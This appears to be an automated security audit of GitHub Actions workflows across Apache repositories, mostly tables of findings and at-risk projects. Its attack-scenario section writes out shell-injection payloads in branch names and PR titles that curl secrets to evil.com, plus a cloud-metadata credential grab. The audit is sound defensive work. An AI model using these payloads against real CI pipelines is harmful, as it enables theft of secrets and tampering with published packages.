# Apache GitHub Review: Combined Risk Assessment

Cross-referencing CI publishing analysis with security scan results across **1205** repositories.

## Companion Reports

| Report | Description |
|--------|-------------|
| [publishing.md](publishing.md) | Which repos publish packages to registries, what ecosystems, auth methods, trusted publishing opportunities. 2387 workflows across 634 repos. |
| [security.md](security.md) | Pattern-matching security checks on cached workflow YAML: injection patterns, unpinned actions, permissions, composite action analysis. 4610 findings across 1205 repos. |

## At a Glance

| Metric | Value |
|--------|-------|
| Repos scanned | 634 |
| Repos publishing to registries | 197 |
| Total security findings | 4610 |
| HIGH findings | 202 |
| Repos needing trusted publishing migration | 70 |
| Top ecosystems | github_releases (108), maven_central (64), docker_hub (60), pypi (34), npm (26) |

## Findings by Vulnerability Type

| Vulnerability | Count | Severity | Description |
|--------------|-------|----------|-------------|
| [No CODEOWNERS File](#no-codeowners-file) | 1193 | LOW | Repository has no CODEOWNERS file for workflow change review. |
| [No Automated Dependency Updates](#no-automated-dependency-updates) | 815 | LOW | No dependabot.yml or renovate.json. ASF policy requires automated dependency management. |
| [Cache Poisoning via PR](#cache-poisoning-via-pr) | 524 | INFO | Workflow uses `actions/cache` with pull_request trigger. |
| [Unpinned Action Tags](#unpinned-action-tags) | 493 | MEDIUM | Third-party actions (outside `actions/*`, `github/*`, `apache/*`) referenced by mutable version tags instead of SHA-pinned commits. |
| [Third-Party Actions](#third-party-actions) | 458 | INFO | Workflow uses actions from outside the `actions/*`, `github/*`, and `apache/*` namespaces. |
| [Self-Hosted Runner Exposure](#self-hosted-runner-exposure) | 329 | HIGH–LOW | Workflow runs on self-hosted runners with PR triggers. Severity depends on permissions and trigger type. |
| [PR Target Code Execution](#pr-target-code-execution) | 219 | CRITICAL–LOW | Workflow uses `pull_request_target` and checks out PR head code. Severity depends on permissions and trigger type. |
| [Workflow Script Injection](#workflow-script-injection) | 215 | LOW–MEDIUM | Direct `${{ }}` interpolation of values in workflow `run:` blocks. |
| [Overly Broad Token Permissions](#overly-broad-token-permissions) | 193 | LOW | Workflow requests more GITHUB_TOKEN scopes than needed. |
| [Composite Action Input Interpolation](#composite-action-input-interpolation) | 75 | LOW | Composite action interpolates inputs in `run:` blocks (trusted callers today). |
| [Composite Action Latent Injection](#composite-action-latent-injection) | 75 | MEDIUM | Composite action interpolates `inputs.*` directly in `run:` blocks. |
| [Unpinned Actions in Composite Actions](#unpinned-actions-in-composite-actions) | 15 | MEDIUM | Composite actions reference third-party actions (outside `actions/*`, `github/*`, `apache/*`) by mutable tags. |
| [codeowners_gap](#codeowners_gap) | 6 | — |  |

## Attack Scenarios

For each vulnerability type found, here is how an attacker could exploit it.

### No CODEOWNERS File

**1193 instances found** | Severity: **LOW**

Without CODEOWNERS requiring security team review of `.github/` changes, any committer can modify workflow files, add new triggers, weaken permissions, or introduce injection patterns without mandatory security review.

**Example attack:**

1. Committer adds `pull_request_target` trigger to an existing workflow
2. No CODEOWNERS rule requires security review for `.github/` changes
3. PR is merged with standard code review (reviewer may miss security implication)
4. Workflow is now vulnerable to external PRs

### No Automated Dependency Updates

**815 instances found** | Severity: **LOW**

Without automated dependency updates, vulnerable transitive dependencies and SHA-pinned actions persist indefinitely. Security fixes are not surfaced as PRs.

**Example attack:**

1. Repository uses `actions/checkout@abc123` (pinned to SHA)
2. A security vulnerability is found in that version
3. No Dependabot or Renovate config to create update PRs
4. Vulnerable action version persists until manually updated

### Cache Poisoning via PR

**524 instances found** | Severity: **INFO**

An attacker's PR can populate the GitHub Actions cache with malicious build artifacts or dependencies. If the cache key is predictable (e.g., based on `hashFiles('**/package-lock.json')`), subsequent runs on the main branch may restore the poisoned cache.

**Example attack:**

1. Workflow caches `node_modules` on PR events
2. Attacker's PR modifies `package-lock.json` to add a malicious package
3. Cache is populated with attacker's dependencies
4. Next main-branch build restores the poisoned cache

### Unpinned Action Tags

**493 instances found** | Severity: **MEDIUM**

An attacker compromises an action's repository (or a maintainer account) and pushes malicious code to an existing tag. Every workflow referencing that tag immediately runs the compromised code. This happened in the real-world `tj-actions/changed-files` supply chain attack (March 2025).

**Example attack:**

1. Workflow uses `cool-org/deploy-action@v2` (mutable tag, outside actions/*/github/*/apache/*)
2. Attacker compromises the action repo and force-pushes to the `v2` tag
3. Next workflow run executes attacker's code with full repo access
4. Fix: pin to SHA — `cool-org/deploy-action@8843d7f92416211de9eb`

### Third-Party Actions

**458 instances found** | Severity: **INFO**

Third-party actions run with full access to the workflow's GITHUB_TOKEN and secrets. A compromised maintainer account, repo transfer, or typosquat can turn a trusted action into a supply chain attack vector.

**Example attack:**

1. Workflow uses `cool-org/deploy-action@v2`
2. `cool-org` maintainer's GitHub account is compromised
3. Attacker pushes malicious code to the `v2` tag
4. Every repo using this action now leaks secrets on next run

### Self-Hosted Runner Exposure

**329 instances found** | Severity: **HIGH–LOW**

Self-hosted runners persist state between jobs. An attacker's PR can execute arbitrary code on the runner, install backdoors, steal credentials cached on disk, or pivot to internal networks the runner has access to.

**Example attack:**

1. Workflow runs on `self-hosted` runner and triggers on `pull_request`
2. Attacker's PR executes: `curl http://169.254.169.254/latest/meta-data/`
3. AWS instance credentials are exfiltrated
4. Attacker gains access to internal infrastructure

### PR Target Code Execution

**219 instances found** | Severity: **CRITICAL–LOW**

An external contributor opens a PR that modifies a script executed by the workflow. Because `pull_request_target` runs with the *base* repo's secrets, the attacker's code can access repository secrets and GITHUB_TOKEN permissions. Severity is modulated by two factors: (1) **Permissions** — if the workflow only has `pull-requests: write` and no `contents: write` or `id-token: write`, blast radius is limited. (2) **Event types** — if the trigger is restricted to `labeled` or `assigned`, a maintainer must explicitly trigger the workflow. CRITICAL = PR head checkout + broad permissions + auto-trigger. MEDIUM = one mitigating factor. LOW = both mitigating factors.

**Example attack:**

1. Attacker forks the repo
2. Modifies `build.sh` to exfiltrate `$NPM_TOKEN` to an external server
3. Opens PR — workflow checks out attacker's branch via `ref: ${{ github.event.pull_request.head.sha }}`
4. If permissions are broad: secrets are leaked; attacker publishes backdoored package
5. If permissions are limited (e.g., pull-requests: write only): attacker can modify PRs but not publish

### Workflow Script Injection

**215 instances found** | Severity: **LOW–MEDIUM**

When untrusted values (PR titles, branch names, issue bodies) are interpolated directly into shell scripts via `${{ }}`, an attacker can inject arbitrary shell commands. Even trusted values like `secrets.*` or `workflow_dispatch` inputs risk log leakage or accidental command injection from malformed input.

**Example attack:**

1. Workflow has: `run: echo "Branch: ${{ github.head_ref }}"`
2. Attacker creates branch named: `main"; curl http://evil.com/steal?t=$SECRET #`
3. Shell interprets the branch name as a command
4. Fix: pass through `env:` block and reference as `$BRANCH`

### Overly Broad Token Permissions

**193 instances found** | Severity: **LOW**

A workflow with `contents: write`, `issues: write`, and `pull-requests: write` gives any compromised step (via unpinned action or injection) the ability to push code, close issues, merge PRs, and modify releases. Least-privilege would limit blast radius.

**Example attack:**

1. Workflow has `permissions: { contents: write, issues: write }`
2. A third-party action in the workflow is compromised
3. Compromised action uses GITHUB_TOKEN to push a backdoor commit
4. Fix: restrict to only needed scopes per job

### Composite Action Input Interpolation

**75 instances found** | Severity: **LOW**

Currently called only from trusted contexts (workflow_dispatch, push to main), but if a future workflow passes untrusted input (PR title, comment body) to this composite action, the interpolation becomes exploitable. The injection surface is pre-positioned — it just needs an unsafe caller.

**Example attack:**

1. Composite action has: `run: ./build.sh --version=${{ inputs.version }}`
2. Today, only called from workflow_dispatch (committers only) — safe
3. Future PR adds: `version: ${{ github.event.pull_request.head.ref }}`
4. Now attacker-controlled input flows into shell execution

### Composite Action Latent Injection

**75 instances found** | Severity: **MEDIUM**

The composite action interpolates `inputs.*` in shell `run:` blocks. This is **not exploitable** as long as every calling workflow passes only trusted values (hardcoded strings, workflow_dispatch inputs from committers, GitHub-controlled values). However, if a future workflow passes attacker-controlled input (PR title, branch name, comment body) to the composite action, the interpolation becomes a shell injection vector. This is a latent risk — the injection surface exists but requires an unsafe caller to become exploitable.

**Example attack:**

1. Composite action has: `run: echo "Building ${{ inputs.version }}"`
2. Today: called with `version: "1.2.3"` from workflow_dispatch (safe)
3. Future PR adds: `version: ${{ github.event.pull_request.title }}` (unsafe)
4. Now attacker sets PR title to: `"; curl http://evil.com/steal?t=$NPM_TOKEN #`

### Unpinned Actions in Composite Actions

**15 instances found** | Severity: **MEDIUM**

Same supply chain risk as unpinned workflow actions, but harder to audit. Reviewers checking `.github/workflows/` won't see the unpinned refs buried inside `.github/actions/*/action.yml`. A compromised dependency action affects all workflows that call the composite action.

**Example attack:**

1. Composite action `.github/actions/build/action.yml` uses `cool-org/cache-action@v4`
2. 15 workflows call this composite action
3. `cool-org/cache-action@v4` tag is compromised
4. All 15 workflows are now executing malicious code

## Immediate Attention Required

Repos with CRITICAL or HIGH security findings that also publish packages.

### apache/beam

**Publishes to:** apache_dist, docker_hub, gcr, gcs, github_releases, maven_central, pypi (4 release, 5 snapshot)  
**Security:** 702 findings — 189 HIGH, 12 MEDIUM, 194 LOW  
**Top issues:** self_hosted_runner (191), broad_permissions (179), composite_action_injection (7)  
**Trusted publishing:** migration opportunity — currently using long-lived tokens ([details](publishing.md#trusted-publishing-migration-opportunities))  
**Details:** [publishing](publishing.md#apachebeam) · [security](security.md#apachebeam)

### apache/gluten

**Publishes to:** apache_dist (1 snapshot)  
**Security:** 11 findings — 1 HIGH, 1 MEDIUM, 3 LOW  
**Top issues:** run_block_injection (1), broad_permissions (1), unpinned_actions (1)  
**Details:** [publishing](publishing.md#apachegluten) · [security](security.md#apachegluten)

## Non-Publishing Repos with HIGH Findings

These repos do not publish packages but have HIGH-severity security findings in their CI workflows.

### apache/iotdb

**Security:** 15 findings — 3 HIGH, 1 MEDIUM, 3 LOW  
**Top issues:** self_hosted_runner (3), run_block_injection (2), unpinned_actions (1)  
**Details:** [security](security.md#apacheiotdb)

### apache/doris-website

**Security:** 6 findings — 1 HIGH, 1 MEDIUM, 4 LOW  
**Top issues:** run_block_injection (2), broad_permissions (1), unpinned_actions (1)  
**Details:** [security](security.md#apachedoris-website)

### apache/helix

**Security:** 6 findings — 2 HIGH, 1 MEDIUM, 3 LOW  
**Top issues:** broad_permissions (2), run_block_injection (1), unpinned_actions (1)  
**Details:** [security](security.md#apachehelix)

### apache/incubator-graphar

**Security:** 5 findings — 1 HIGH, 1 MEDIUM, 2 LOW  
**Top issues:** cache_poisoning (1), unpinned_actions (1), missing_codeowners (1)  
**Details:** [security](security.md#apacheincubator-graphar)

### apache/dubbo-python

**Security:** 3 findings — 1 HIGH, 2 LOW  
**Top issues:** broad_permissions (1), missing_codeowners (1), missing_dependency_updates (1)  
**Details:** [security](security.md#apachedubbo-python)

### apache/solr

**Security:** 3 findings — 1 HIGH, 1 MEDIUM, 1 LOW  
**Top issues:** self_hosted_runner (1), unpinned_actions (1), missing_codeowners (1)  
**Details:** [security](security.md#apachesolr)

### apache/struts-examples

**Security:** 3 findings — 1 HIGH, 1 LOW  
**Top issues:** broad_permissions (1), missing_codeowners (1)  
**Details:** [security](security.md#apachestruts-examples)

### apache/teaclave-java-tee-sdk

**Security:** 3 findings — 1 HIGH, 2 LOW  
**Top issues:** self_hosted_runner (1), missing_codeowners (1), missing_dependency_updates (1)  
**Details:** [security](security.md#apacheteaclave-java-tee-sdk)

### apache/zeppelin-site

**Security:** 3 findings — 1 HIGH, 2 LOW  
**Top issues:** broad_permissions (1), missing_codeowners (1), missing_dependency_updates (1)  
**Details:** [security](security.md#apachezeppelin-site)

## Moderate Risk: Publishing Repos with MEDIUM Findings

These repos publish packages and have MEDIUM-severity findings (typically unpinned actions).

| Repo | Ecosystems | Findings | Top Issue | Trusted Pub | Details |
|------|-----------|----------|-----------|------------|---------|
| apache/dolphinscheduler | docker_hub, ghcr, helm, maven_central | 11 | run_block_injection | — | [publishing](publishing.md#apachedolphinscheduler) · [security](security.md#apachedolphinscheduler) |
| apache/grails-core | apache_dist, gcr, github_releases, maven_central | 11 | run_block_injection | — | [publishing](publishing.md#apachegrails-core) · [security](security.md#apachegrails-core) |
| apache/grails-gradle-publish | apache_dist, github_pages, github_releases, maven_central | 5 | run_block_injection | — | [publishing](publishing.md#apachegrails-gradle-publish) · [security](security.md#apachegrails-gradle-publish) |
| apache/arrow | apache_dist, github_releases | 24 | run_block_injection | — | [publishing](publishing.md#apachearrow) · [security](security.md#apachearrow) |
| apache/casbin-lego | docker_hub, github_pages, github_releases | 6 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-lego) · [security](security.md#apachecasbin-lego) |
| apache/fory | crates_io, maven_central, pypi | 5 | unpinned_actions | — | [publishing](publishing.md#apachefory) · [security](security.md#apachefory) |
| apache/casbin-rust-dufs-with-casbin | crates_io, docker_hub, github_releases | 3 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-rust-dufs-with-casbin) · [security](security.md#apachecasbin-rust-dufs-with-casbin) |
| apache/datafusion-comet | ghcr | 19 | composite_action_injection | — | [publishing](publishing.md#apachedatafusion-comet) · [security](security.md#apachedatafusion-comet) |
| apache/camel-k | docker_hub, maven_central | 8 | composite_action_injection | — | [publishing](publishing.md#apachecamel-k) · [security](security.md#apachecamel-k) |
| apache/doris-opentelemetry-demo | docker_hub, ghcr | 6 | run_block_injection | — | [publishing](publishing.md#apachedoris-opentelemetry-demo) · [security](security.md#apachedoris-opentelemetry-demo) |
| apache/casbin-dart-casbin | dart_pub, github_releases | 5 | run_block_injection | — | [publishing](publishing.md#apachecasbin-dart-casbin) · [security](security.md#apachecasbin-dart-casbin) |
| apache/casbin-ex | github_releases, hex | 5 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-ex) · [security](security.md#apachecasbin-ex) |
| apache/casbin-lua-casbin | github_releases, luarocks | 5 | run_block_injection | — | [publishing](publishing.md#apachecasbin-lua-casbin) · [security](security.md#apachecasbin-lua-casbin) |
| apache/casbin-rust-string-adapter | crates_io, github_releases | 5 | run_block_injection | migrate | [publishing](publishing.md#apachecasbin-rust-string-adapter) · [security](security.md#apachecasbin-rust-string-adapter) |
| apache/kyuubi | docker_hub, maven_central | 5 | unpinned_actions | — | [publishing](publishing.md#apachekyuubi) · [security](security.md#apachekyuubi) |
| apache/answer | docker_hub, github_releases | 4 | unpinned_actions | — | [publishing](publishing.md#apacheanswer) · [security](security.md#apacheanswer) |
| apache/avro | maven_central | 14 | unpinned_actions | — | [publishing](publishing.md#apacheavro) · [security](security.md#apacheavro) |
| apache/casbin-Casbin.NET | github_packages, nuget | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-casbinnet) · [security](security.md#apachecasbin-casbinnet) |
| apache/casbin-Casbin.NET-redis-adapter | github_packages, nuget | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-casbinnet-redis-adapter) · [security](security.md#apachecasbin-casbinnet-redis-adapter) |
| apache/casbin-actix-casbin-auth | crates_io, github_releases | 4 | run_block_injection | migrate | [publishing](publishing.md#apachecasbin-actix-casbin-auth) · [security](security.md#apachecasbin-actix-casbin-auth) |
| apache/casbin-admission-webhook | docker_hub, github_releases | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-admission-webhook) · [security](security.md#apachecasbin-admission-webhook) |
| apache/casbin-axum-casbin | crates_io, github_releases | 4 | run_block_injection | migrate | [publishing](publishing.md#apachecasbin-axum-casbin) · [security](security.md#apachecasbin-axum-casbin) |
| apache/casbin-jcasbin-lettuce-redis-watcher | github_releases, maven_central | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-lettuce-redis-watcher) · [security](security.md#apachecasbin-jcasbin-lettuce-redis-watcher) |
| apache/casbin-jcasbin-mongo-adapter | github_releases, maven_central | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-mongo-adapter) · [security](security.md#apachecasbin-jcasbin-mongo-adapter) |
| apache/casbin-jcasbin-redis-watcher | github_releases, maven_central | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-redis-watcher) · [security](security.md#apachecasbin-jcasbin-redis-watcher) |
| apache/casbin-jcasbin-shiro-casbin | github_releases, maven_central | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-shiro-casbin) · [security](security.md#apachecasbin-jcasbin-shiro-casbin) |
| apache/casbin-node-casbin-expression-eval | github_releases, npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-expression-eval) · [security](security.md#apachecasbin-node-casbin-expression-eval) |
| apache/casbin-node-casbin-file-adapter | github_releases, npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-file-adapter) · [security](security.md#apachecasbin-node-casbin-file-adapter) |
| apache/casbin-node-casbin-node-redis-adapter | github_releases, npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-node-redis-adapter) · [security](security.md#apachecasbin-node-casbin-node-redis-adapter) |
| apache/casbin-node-casbin-prisma-adapter | github_releases, npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-prisma-adapter) · [security](security.md#apachecasbin-node-casbin-prisma-adapter) |
| apache/casbin-pycasbin | github_releases, pypi | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-pycasbin) · [security](security.md#apachecasbin-pycasbin) |
| apache/casbin-python-fastapi-casbin-auth | github_releases, pypi | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-python-fastapi-casbin-auth) · [security](security.md#apachecasbin-python-fastapi-casbin-auth) |
| apache/casbin-python-pymongo-adapter | github_releases, pypi | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-python-pymongo-adapter) · [security](security.md#apachecasbin-python-pymongo-adapter) |
| apache/casbin-rust-actix-casbin | crates_io, github_releases | 4 | run_block_injection | migrate | [publishing](publishing.md#apachecasbin-rust-actix-casbin) · [security](security.md#apachecasbin-rust-actix-casbin) |
| apache/casbin-rust-diesel-adapter | crates_io, github_releases | 4 | run_block_injection | migrate | [publishing](publishing.md#apachecasbin-rust-diesel-adapter) · [security](security.md#apachecasbin-rust-diesel-adapter) |
| apache/casbin-rust-rocket-authz | crates_io, github_releases | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-rust-rocket-authz) · [security](security.md#apachecasbin-rust-rocket-authz) |
| apache/casbin-vscode-plugin | github_releases, npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-vscode-plugin) · [security](security.md#apachecasbin-vscode-plugin) |
| apache/cassandra-sidecar | ghcr, github_releases | 4 | run_block_injection | — | [publishing](publishing.md#apachecassandra-sidecar) · [security](security.md#apachecassandra-sidecar) |
| apache/daffodil-sbt | apache_dist, maven_central | 4 | unpinned_actions | — | [publishing](publishing.md#apachedaffodil-sbt) · [security](security.md#apachedaffodil-sbt) |
| apache/doris-operator | docker_hub, helm | 4 | unpinned_actions | — | [publishing](publishing.md#apachedoris-operator) · [security](security.md#apachedoris-operator) |
| apache/hudi-rs | crates_io, pypi | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachehudi-rs) · [security](security.md#apachehudi-rs) |
| apache/incubator-devlake-helm-chart | ghcr, helm | 4 | unpinned_actions | — | [publishing](publishing.md#apacheincubator-devlake-helm-chart) · [security](security.md#apacheincubator-devlake-helm-chart) |
| apache/casbin-jcasbin | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin) · [security](security.md#apachecasbin-jcasbin) |
| apache/casbin-jcasbin-dynamodb-adapter | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-dynamodb-adapter) · [security](security.md#apachecasbin-jcasbin-dynamodb-adapter) |
| apache/casbin-jcasbin-hibernate-adapter | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-hibernate-adapter) · [security](security.md#apachecasbin-jcasbin-hibernate-adapter) |
| apache/casbin-jcasbin-jdbc-adapter | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-jdbc-adapter) · [security](security.md#apachecasbin-jcasbin-jdbc-adapter) |
| apache/casbin-jcasbin-jfinal-authz | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-jfinal-authz) · [security](security.md#apachecasbin-jcasbin-jfinal-authz) |
| apache/casbin-jcasbin-kafka-casbin | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-kafka-casbin) · [security](security.md#apachecasbin-jcasbin-kafka-casbin) |
| apache/casbin-jcasbin-mybatis-adapter | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-mybatis-adapter) · [security](security.md#apachecasbin-jcasbin-mybatis-adapter) |
| apache/casbin-jcasbin-mybatisplus-adapter | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-mybatisplus-adapter) · [security](security.md#apachecasbin-jcasbin-mybatisplus-adapter) |
| apache/casbin-jcasbin-nutz-authz | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-nutz-authz) · [security](security.md#apachecasbin-jcasbin-nutz-authz) |
| apache/casbin-jcasbin-play-authz | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-play-authz) · [security](security.md#apachecasbin-jcasbin-play-authz) |
| apache/casbin-jcasbin-rabbitmq-watcher | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-rabbitmq-watcher) · [security](security.md#apachecasbin-jcasbin-rabbitmq-watcher) |
| apache/casbin-jcasbin-redis-adapter | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-redis-adapter) · [security](security.md#apachecasbin-jcasbin-redis-adapter) |
| apache/casbin-jcasbin-redis-watcher-ex | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-redis-watcher-ex) · [security](security.md#apachecasbin-jcasbin-redis-watcher-ex) |
| apache/casbin-jcasbin-spring-security-starter | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-spring-security-starter) · [security](security.md#apachecasbin-jcasbin-spring-security-starter) |
| apache/casbin-jcasbin-string-adapter | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-string-adapter) · [security](security.md#apachecasbin-jcasbin-string-adapter) |
| apache/casbin-jcasbin-vertx-authz | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-vertx-authz) · [security](security.md#apachecasbin-jcasbin-vertx-authz) |
| apache/casbin-jcasbin-zookeeper-watcher | github_releases, maven_central | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-jcasbin-zookeeper-watcher) · [security](security.md#apachecasbin-jcasbin-zookeeper-watcher) |
| apache/casbin-js-vue-authz | github_releases, npm | 3 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-js-vue-authz) · [security](security.md#apachecasbin-js-vue-authz) |
| apache/casbin-nest-authz | github_releases, npm | 3 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-nest-authz) · [security](security.md#apachecasbin-nest-authz) |
| apache/casbin-rust-postgres-adapter | crates_io, github_releases | 3 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-rust-postgres-adapter) · [security](security.md#apachecasbin-rust-postgres-adapter) |
| apache/casbin-rust-semantic-release-action-rust | crates_io, github_releases | 3 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-rust-semantic-release-action-rust) · [security](security.md#apachecasbin-rust-semantic-release-action-rust) |
| apache/fluss-rust | crates_io, pypi | 3 | unpinned_actions | migrate | [publishing](publishing.md#apachefluss-rust) · [security](security.md#apachefluss-rust) |
| apache/hamilton | docker_hub, pypi | 3 | unpinned_actions | — | [publishing](publishing.md#apachehamilton) · [security](security.md#apachehamilton) |
| apache/arrow-flight-sql-postgresql | ghcr, github_releases | 2 | unpinned_actions | — | [publishing](publishing.md#apachearrow-flight-sql-postgresql) · [security](security.md#apachearrow-flight-sql-postgresql) |
| apache/cassandra-easy-stress | ghcr, github_releases | 2 | unpinned_actions | — | [publishing](publishing.md#apachecassandra-easy-stress) · [security](security.md#apachecassandra-easy-stress) |
| apache/arrow-nanoarrow | pypi | 11 | self_hosted_runner | migrate | [publishing](publishing.md#apachearrow-nanoarrow) · [security](security.md#apachearrow-nanoarrow) |
| apache/celeborn | docker_hub | 8 | run_block_injection | — | [publishing](publishing.md#apacheceleborn) · [security](security.md#apacheceleborn) |
| apache/gravitino | docker_hub | 8 | run_block_injection | — | [publishing](publishing.md#apachegravitino) · [security](security.md#apachegravitino) |
| apache/casbin-rs | crates_io | 7 | run_block_injection | migrate | [publishing](publishing.md#apachecasbin-rs) · [security](security.md#apachecasbin-rs) |
| apache/cloudstack | docker_hub | 6 | run_block_injection | — | [publishing](publishing.md#apachecloudstack) · [security](security.md#apachecloudstack) |
| apache/datafusion-ballista | ghcr | 6 | unpinned_actions | — | [publishing](publishing.md#apachedatafusion-ballista) · [security](security.md#apachedatafusion-ballista) |
| apache/dubbo-go-pixiu | github_releases | 6 | prt_checkout | — | [publishing](publishing.md#apachedubbo-go-pixiu) · [security](security.md#apachedubbo-go-pixiu) |
| apache/dubbo-go-pixiu-samples | github_releases | 6 | prt_checkout | — | [publishing](publishing.md#apachedubbo-go-pixiu-samples) · [security](security.md#apachedubbo-go-pixiu-samples) |
| apache/flink-kubernetes-operator | maven_central | 6 | run_block_injection | — | [publishing](publishing.md#apacheflink-kubernetes-operator) · [security](security.md#apacheflink-kubernetes-operator) |
| apache/hive | docker_hub | 6 | run_block_injection | — | [publishing](publishing.md#apachehive) · [security](security.md#apachehive) |
| apache/arrow-go | github_releases | 5 | unpinned_actions | — | [publishing](publishing.md#apachearrow-go) · [security](security.md#apachearrow-go) |
| apache/camel-k-runtime | maven_central | 5 | unpinned_actions | — | [publishing](publishing.md#apachecamel-k-runtime) · [security](security.md#apachecamel-k-runtime) |
| apache/cloudstack-kubernetes-provider | docker_hub | 5 | run_block_injection | — | [publishing](publishing.md#apachecloudstack-kubernetes-provider) · [security](security.md#apachecloudstack-kubernetes-provider) |
| apache/datafusion-ray | ghcr | 5 | unpinned_actions | — | [publishing](publishing.md#apachedatafusion-ray) · [security](security.md#apachedatafusion-ray) |
| apache/hertzbeat | docker_hub | 5 | unpinned_actions | — | [publishing](publishing.md#apachehertzbeat) · [security](security.md#apachehertzbeat) |
| apache/kvrocks | docker_hub | 5 | unpinned_actions | — | [publishing](publishing.md#apachekvrocks) · [security](security.md#apachekvrocks) |
| apache/apisix-ingress-controller | docker_hub | 4 | unpinned_actions | — | [publishing](publishing.md#apacheapisix-ingress-controller) · [security](security.md#apacheapisix-ingress-controller) |
| apache/bifromq | docker_hub | 4 | run_block_injection | — | [publishing](publishing.md#apachebifromq) · [security](security.md#apachebifromq) |
| apache/casbin-core | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-core) · [security](security.md#apachecasbin-core) |
| apache/casbin-docker_auth | docker_hub | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-docker_auth) · [security](security.md#apachecasbin-docker_auth) |
| apache/casbin-gateway | docker_hub | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-gateway) · [security](security.md#apachecasbin-gateway) |
| apache/casbin-go-cli | github_releases | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-go-cli) · [security](security.md#apachecasbin-go-cli) |
| apache/casbin-mcp-gateway | github_releases | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-mcp-gateway) · [security](security.md#apachecasbin-mcp-gateway) |
| apache/casbin-node-casbin | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin) · [security](security.md#apachecasbin-node-casbin) |
| apache/casbin-node-casbin-couchdb-adapter | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-couchdb-adapter) · [security](security.md#apachecasbin-node-casbin-couchdb-adapter) |
| apache/casbin-node-casbin-drizzle-adapter | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-drizzle-adapter) · [security](security.md#apachecasbin-node-casbin-drizzle-adapter) |
| apache/casbin-node-casbin-mongo-changestream-watcher | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-mongo-changestream-watcher) · [security](security.md#apachecasbin-node-casbin-mongo-changestream-watcher) |
| apache/casbin-node-casbin-mongoose-adapter | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-mongoose-adapter) · [security](security.md#apachecasbin-node-casbin-mongoose-adapter) |
| apache/casbin-node-casbin-redis-watcher | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-node-casbin-redis-watcher) · [security](security.md#apachecasbin-node-casbin-redis-watcher) |
| apache/casbin-python-graphql-authz | pypi | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-python-graphql-authz) · [security](security.md#apachecasbin-python-graphql-authz) |
| apache/casbin-python-rabbitmq-watcher | pypi | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-python-rabbitmq-watcher) · [security](security.md#apachecasbin-python-rabbitmq-watcher) |
| apache/casbin-python-redis-adapter | pypi | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-python-redis-adapter) · [security](security.md#apachecasbin-python-redis-adapter) |
| apache/casbin-rust-casbin-rust-cli | crates_io | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-rust-casbin-rust-cli) · [security](security.md#apachecasbin-rust-casbin-rust-cli) |
